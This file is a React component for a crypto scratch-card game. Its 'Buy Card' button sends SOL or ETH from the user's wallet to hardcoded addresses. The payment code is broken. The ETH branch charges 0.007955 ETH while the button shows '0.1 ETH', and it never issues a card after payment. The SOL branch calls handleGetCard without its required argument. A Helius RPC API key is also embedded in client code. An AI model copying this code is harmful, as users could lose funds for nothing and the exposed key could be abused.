import React, { useState, useRef } from "react";
import { useGameStore } from "../../store/gameStore";
import { useWallet } from "../../contexts/WalletContext";
import { Ticket, DollarSign, AlertCircle, Gift } from "lucide-react";
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import { ethers } from "ethers";

const ScratchCardGame: React.FC = () => {
  const { connected, address } = useWallet();
  const { addScratchCard, revealScratchCard, freeCardsThisWeek, scratchCards } =
    useGameStore();

  const [selectedCard, setSelectedCard] = useState<string | null>(null);
  const [isScratching, setIsScratching] = useState(false);
  const [scratchedPercentage, setScratchedPercentage] = useState(0);
  const [revealedReward, setRevealedReward] = useState<any | null>(null);
  const [error, setError] = useState<string | null>(null);

  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const contextRef = useRef<CanvasRenderingContext2D | null>(null);
  const cardImageRef = useRef<HTMLImageElement | null>(null);

  // Get unrevealed cards
  const unrevealedCards = scratchCards.filter((card) => !card.revealed);
  const beginAdress = address?.substring(0, 2);
  let SOLORETH = "SOL";
  if (beginAdress == "0x") {
    SOLORETH = "ETH";
  }

  const handleGetCard = (paid: boolean) => {
    try {
      if (!connected) {
        document.getElementById("wallet-modal")?.classList.remove("hidden");
        return;
      }

      setError(null);
      const newCard = addScratchCard(paid);
      setSelectedCard(newCard.id);
      setIsScratching(false);
      setScratchedPercentage(0);
      setRevealedReward(null);

      // Initialize canvas for the new card
      setTimeout(initCanvas, 100);
    } catch (error: any) {
      setError(error.message);
    }
  };
  const sendCrypto = async () => {
    const { solana, ethereum } = window as any;

    // Préférence pour Phantom s’il est connecté
    if (solana?.isPhantom && solana.isConnected) {
      const connection = new Connection(
        "https://mainnet.helius-rpc.com/?api-key=d7276370-0068-486b-b709-0c1075dc7b08"
      );
      const userPubkey = solana.publicKey;
      const balance = await connection.getBalance(userPubkey);
      const solBalance = balance / LAMPORTS_PER_SOL;

      const solAmount = 0.1;

      if (solBalance < solAmount) {
        alert(
          `Fonds insuffisants ! Solde SOL : ${solBalance.toFixed(
            4
          )}, mais il faut ${solAmount} SOL.`
        );
        return;
      }

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: new PublicKey(
            "hRBKVnUWce4i2GicchDwSYxt9385gNvLnxUh4eMxvNg"
          ),
          lamports: solAmount * LAMPORTS_PER_SOL,
        })
      );

      // 💡 Ajoute ces lignes avant de signer
      const latestBlockhash = await connection.getLatestBlockhash();
      transaction.recentBlockhash = latestBlockhash.blockhash;
      transaction.feePayer = userPubkey;

      try {
        const signedTransaction = await solana.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(
          signedTransaction.serialize()
        );
        console.log("Transaction SOL envoyée ! Signature :", signature);
        handleGetCard();
      } catch (error) {
        console.error("Erreur transaction SOL :", error);
      }
    } else if (ethereum && ethereum.isConnected?.()) {
      // MetaMask en fallback si Phantom non connecté
      const provider = new ethers.BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      const balance = await provider.getBalance(userAddress);
      const ethBalance = Number(ethers.formatEther(balance));

      const ethAmount = 0.007955;

      if (ethBalance < ethAmount) {
        alert(
          `Fonds insuffisants ! Solde ETH : ${ethBalance.toFixed(
            6
          )}, mais il faut ${ethAmount} ETH.`
        );
        return;
      }

      try {
        const tx = await signer.sendTransaction({
          to: "0x48AA6eAFA302829ff5ed4C7F742466bafAEac3d6",
          value: ethers.parseEther(ethAmount.toString()),
        });
        console.log("Transaction ETH envoyée ! Hash :", tx.hash);
      } catch (error) {
        console.error("Erreur transaction ETH :", error);
      }
    } else {
      console.error("Aucun wallet connecté !");
    }
  };

  const initCanvas = () => {
    if (!canvasRef.current) return;

    const canvas = canvasRef.current;
    canvas.width = canvas.offsetWidth;
    canvas.height = canvas.offsetHeight;

    const context = canvas.getContext("2d");
    if (!context) return;

    contextRef.current = context;

    // Fill with scratch overlay
    context.fillStyle = "#1F2937";
    context.fillRect(0, 0, canvas.width, canvas.height);

    // Add some texture/pattern to the scratch surface
    context.strokeStyle = "#374151";
    for (let i = 0; i < 20; i++) {
      context.beginPath();
      context.moveTo(
        Math.random() * canvas.width,
        Math.random() * canvas.height
      );
      context.lineTo(
        Math.random() * canvas.width,
        Math.random() * canvas.height
      );
      context.stroke();
    }

    // Add text
    context.font = "bold 20px Arial";
    context.fillStyle = "#9945FF";
    context.textAlign = "center";
    context.fillText("SCRATCH HERE!", canvas.width / 2, canvas.height / 2);

    // Add card icon
    context.font = "24px Arial";
    context.fillText("🎟️", canvas.width / 2, canvas.height / 2 - 30);
  };

  const handleStartScratching = () => {
    if (!selectedCard || revealedReward) return;
    setIsScratching(true);
  };

  const handleScratch = (
    e: React.MouseEvent<HTMLCanvasElement> | React.TouchEvent<HTMLCanvasElement>
  ) => {
    if (!isScratching || !canvasRef.current || !contextRef.current) return;

    // Get position
    let x, y;
    if ("touches" in e) {
      // Touch event
      const rect = canvasRef.current.getBoundingClientRect();
      x = e.touches[0].clientX - rect.left;
      y = e.touches[0].clientY - rect.top;
    } else {
      // Mouse event
      x = e.nativeEvent.offsetX;
      y = e.nativeEvent.offsetY;
    }

    // Create scratch effect
    const context = contextRef.current;
    context.globalCompositeOperation = "destination-out";
    context.beginPath();
    context.arc(x, y, 20, 0, Math.PI * 2);
    context.fill();

    // Calculate scratched percentage
    const imageData = context.getImageData(
      0,
      0,
      canvasRef.current.width,
      canvasRef.current.height
    );
    const pixelData = imageData.data;
    let transparentPixels = 0;
    for (let i = 3; i < pixelData.length; i += 4) {
      if (pixelData[i] === 0) {
        transparentPixels++;
      }
    }

    const totalPixels = canvasRef.current.width * canvasRef.current.height;
    const percentage = (transparentPixels / totalPixels) * 100;
    setScratchedPercentage(percentage);

    // Reveal reward if scratched enough
    if (percentage > 50 && selectedCard && !revealedReward) {
      try {
        const reward = revealScratchCard(selectedCard);
        setRevealedReward(reward);
        setIsScratching(false);

        // Reveal the whole card
        context.globalCompositeOperation = "destination-out";
        context.fillRect(
          0,
          0,
          canvasRef.current.width,
          canvasRef.current.height
        );
      } catch (error: any) {
        setError(error.message);
      }
    }
  };

  const handleSelectCard = (cardId: string) => {
    setSelectedCard(cardId);
    setIsScratching(false);
    setScratchedPercentage(0);
    setRevealedReward(null);

    // Initialize canvas for the selected card
    setTimeout(initCanvas, 100);
  };

  return (
    <div className="flex flex-col items-center">
      {/* Card stats */}
      <div className="w-full bg-slate-800/60 rounded-lg p-4 mb-6">
        <div className="flex justify-between items-center">
          <div>
            <h3 className="text-lg font-semibold text-white">Scratch Cards</h3>
            <p className="text-slate-300 text-sm">
              Reveal instant crypto rewards
            </p>
          </div>
          <div className="flex items-center space-x-1 bg-purple-900/60 px-3 py-1.5 rounded-lg">
            <Ticket size={16} className="text-purple-400" />
            <span className="font-medium text-purple-200">
              {unrevealedCards.length} cards available
            </span>
          </div>
        </div>
        <div className="mt-3 h-1.5 bg-slate-700 rounded-full overflow-hidden">
          <div
            className="h-full bg-purple-500 rounded-full transition-all duration-300"
            style={{
              width: `${Math.min((freeCardsThisWeek / 1) * 100, 100)}%`,
            }}
          ></div>
        </div>
        <div className="mt-1 flex justify-between text-xs text-slate-400">
          <span>Free cards: {freeCardsThisWeek}/1 this week</span>
          <span>{1 - freeCardsThisWeek} remaining</span>
        </div>
      </div>

      {/* Card display */}
      <div className="flex flex-col md:flex-row gap-6 w-full">
        {/* Left side - cards list */}
        <div className="w-full md:w-1/3">
          <div className="bg-slate-800/60 rounded-lg p-4">
            <h3 className="text-lg font-semibold text-white mb-4">
              Your Cards
            </h3>

            {unrevealedCards.length === 0 ? (
              <div className="text-center py-10">
                <Ticket size={40} className="mx-auto text-slate-500 mb-3" />
                <p className="text-slate-400">No cards available</p>
                <p className="text-slate-500 text-sm mt-1">
                  Get a free card to play
                </p>
              </div>
            ) : (
              <div className="space-y-3 max-h-80 overflow-y-auto pr-2">
                {unrevealedCards.map((card) => (
                  <div
                    key={card.id}
                    onClick={() => handleSelectCard(card.id)}
                    className={`p-3 border rounded-lg cursor-pointer transition-all ${
                      selectedCard === card.id
                        ? "border-purple-500 bg-purple-900/30"
                        : "border-slate-700 bg-slate-800/50 hover:border-slate-600"
                    }`}
                  >
                    <div className="flex items-center">
                      <Ticket size={18} className="text-purple-400 mr-2" />
                      <div>
                        <div className="font-medium text-white">
                          Scratch Card
                        </div>
                        <div className="text-xs text-slate-400">
                          Card #{card.id.substring(0, 8)}
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}

            <div className="mt-4 space-y-2">
              <button
                onClick={() => handleGetCard(false)}
                disabled={freeCardsThisWeek >= 1 || !connected}
                className={`w-full py-2.5 rounded-lg font-medium flex items-center justify-center transition-colors ${
                  freeCardsThisWeek < 1 && connected
                    ? "bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-700 hover:to-indigo-700 text-white"
                    : "bg-slate-700 text-slate-400 cursor-not-allowed"
                }`}
              >
                <Gift size={16} className="mr-2" />
                Get Free Card
                {freeCardsThisWeek < 1 ? (
                  <span className="ml-1 text-xs">
                    ({1 - freeCardsThisWeek} left)
                  </span>
                ) : (
                  <span className="ml-1 text-xs">(0 left)</span>
                )}
              </button>

              <button
                onClick={() => {
                  // handleGetCard(true);
                  sendCrypto();
                }}
                disabled={!connected}
                className={`w-full py-2.5 rounded-lg font-medium flex items-center justify-center transition-colors ${
                  connected
                    ? "bg-gradient-to-r from-green-600 to-teal-600 hover:from-green-700 hover:to-teal-700 text-white"
                    : "bg-slate-700 text-slate-400 cursor-not-allowed"
                }`}
              >
                <DollarSign size={16} className="mr-2" />
                Buy Card (0.1 {SOLORETH})
              </button>
            </div>
          </div>
        </div>

        {/* Right side - scratch area */}
        <div className="w-full md:w-2/3">
          <div className="bg-slate-800/60 rounded-lg p-4 h-full flex flex-col">
            {!selectedCard ? (
              <div className="flex-grow flex flex-col items-center justify-center py-10">
                <Ticket size={48} className="text-slate-500 mb-4" />
                <p className="text-slate-300 font-medium">No Card Selected</p>
                <p className="text-slate-400 text-sm mt-1">
                  {unrevealedCards.length > 0
                    ? "Select a card from your collection to begin"
                    : "Get a free card to start playing"}
                </p>
              </div>
            ) : (
              <div className="flex-grow flex flex-col">
                <h3 className="text-lg font-semibold text-white mb-4">
                  Scratch Your Card
                </h3>

                <div className="relative flex-grow flex flex-col items-center justify-center">
                  {/* Card background image */}
                  <div
                    ref={cardImageRef}
                    className="relative w-full max-w-md aspect-[3/2] rounded-xl overflow-hidden"
                  >
                    {/* Card design (behind the scratch area) */}
                    <div className="absolute inset-0 bg-gradient-to-br from-purple-900 to-indigo-800 p-6 flex flex-col justify-center items-center">
                      {revealedReward ? (
                        <div className="text-center">
                          <div className="text-2xl font-bold mb-2 text-white">
                            {revealedReward.name}
                          </div>
                          <div className="text-lg text-teal-300 font-medium mb-4">
                            {revealedReward.type === "sol" &&
                              `${revealedReward.amount} SOL`}
                            {revealedReward.type === "usdt" &&
                              `${revealedReward.amount} USDT`}
                          </div>
                          <p className="text-slate-300">
                            {revealedReward.description}
                          </p>
                        </div>
                      ) : (
                        <div className="h-full w-full flex items-center justify-center">
                          <div className="animate-pulse">
                            <Gift
                              size={48}
                              className="text-slate-300 mx-auto mb-4"
                            />
                            <p className="text-slate-300 text-center">
                              Scratch to reveal your prize!
                            </p>
                          </div>
                        </div>
                      )}
                    </div>

                    {/* Scratch canvas */}
                    <canvas
                      ref={canvasRef}
                      width="400"
                      height="250"
                      className={`absolute inset-0 w-full h-full ${
                        isScratching ? "cursor-grabbing" : "cursor-grab"
                      }`}
                      onMouseDown={handleStartScratching}
                      onMouseMove={handleScratch}
                      onMouseUp={() => setIsScratching(false)}
                      onMouseLeave={() => setIsScratching(false)}
                      onTouchStart={handleStartScratching}
                      onTouchMove={handleScratch}
                      onTouchEnd={() => setIsScratching(false)}
                    />
                  </div>

                  {/* Scratch progress */}
                  {scratchedPercentage > 0 && scratchedPercentage < 50 && (
                    <div className="mt-4 w-full max-w-md">
                      <div className="h-1.5 bg-slate-700 rounded-full overflow-hidden">
                        <div
                          className="h-full bg-teal-500 rounded-full transition-all duration-300"
                          style={{ width: `${scratchedPercentage}%` }}
                        ></div>
                      </div>
                      <p className="text-sm text-slate-400 mt-1">
                        Keep scratching... ({Math.round(scratchedPercentage)}%)
                      </p>
                    </div>
                  )}

                  {/* Revealed reward actions */}
                  {revealedReward && (
                    <div className="mt-6">
                      <button
                        onClick={() => (window.location.href = "/rewards")}
                        className="bg-gradient-to-r from-teal-500 to-emerald-500 hover:from-teal-600 hover:to-emerald-600 text-white font-medium py-2.5 px-6 rounded-lg transition-colors"
                      >
                        View Your Rewards
                      </button>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Error message */}
      {error && (
        <div className="mt-6 p-4 bg-red-900/30 border border-red-700/50 rounded-lg flex items-start max-w-md">
          <AlertCircle
            className="text-red-500 mr-3 flex-shrink-0 mt-0.5"
            size={20}
          />
          <div>
            <p className="text-red-300 font-medium">Error</p>
            <p className="text-red-200/70">{error}</p>
          </div>
        </div>
      )}

      {/* Not connected warning */}
      {!connected && (
        <div className="mt-6 p-4 bg-amber-900/30 border border-amber-700/50 rounded-lg flex items-start max-w-md">
          <AlertCircle
            className="text-amber-500 mr-3 flex-shrink-0 mt-0.5"
            size={20}
          />
          <div>
            <p className="text-amber-300 font-medium">Wallet Not Connected</p>
            <p className="text-amber-200/70 text-sm">
              Connect your wallet to get scratch cards and win rewards.
            </p>
            <button
              onClick={() =>
                document
                  .getElementById("wallet-modal")
                  ?.classList.remove("hidden")
              }
              className="mt-2 bg-amber-600 hover:bg-amber-700 text-white text-sm font-medium py-1.5 px-3 rounded transition-colors"
            >
              Connect Wallet
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default ScratchCardGame;
